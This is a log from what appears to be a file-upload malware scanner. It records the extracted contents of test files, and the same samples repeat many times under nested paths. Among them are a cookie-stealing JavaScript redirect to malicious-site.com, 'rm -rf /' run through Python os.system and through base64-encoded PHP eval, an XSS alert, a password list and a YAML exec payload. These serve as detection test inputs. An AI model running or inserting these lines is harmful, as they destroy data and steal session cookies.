2025-02-22 20:19:31,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:19:31,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:19:31,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:19:31,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:19:31,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:19:31,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:19:31,054 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:19:31,054 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:19:31,054 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:19:31,054 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:19:31,054 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:19:31,054 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:19:31,054 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:19:31,054 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:19:31,054 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:19:31,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:19:31,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:19:31,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:19:31,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:19:31,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:19:31,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:19:31,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:19:31,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:19:31,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:19:31,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:19:31,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:19:31,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:19:31,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:19:31,056 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:19:31,056 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:19:31,056 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:19:31,056 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:19:31,058 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:19:31,058 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:19:31,058 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:19:31,058 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:19:31,058 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:20:02,294 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:20:02,294 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:20:02,294 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:20:02,295 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:20:02,295 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:20:02,295 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:20:02,295 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:20:02,295 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:20:02,295 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:20:02,295 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:20:02,295 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:20:02,295 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:20:02,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:20:02,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:20:02,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:20:02,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:20:02,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:20:02,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:20:02,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:20:02,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:20:02,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:20:02,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:20:02,297 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:20:02,297 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:20:02,297 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:20:02,297 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:20:02,297 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:20:02,297 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:20:02,297 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:20:02,297 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:20:02,297 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:20:02,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:20:02,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:20:02,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:20:02,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:20:02,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:20:02,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:20:02,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:20:02,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:20:02,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:20:02,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:20:02,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
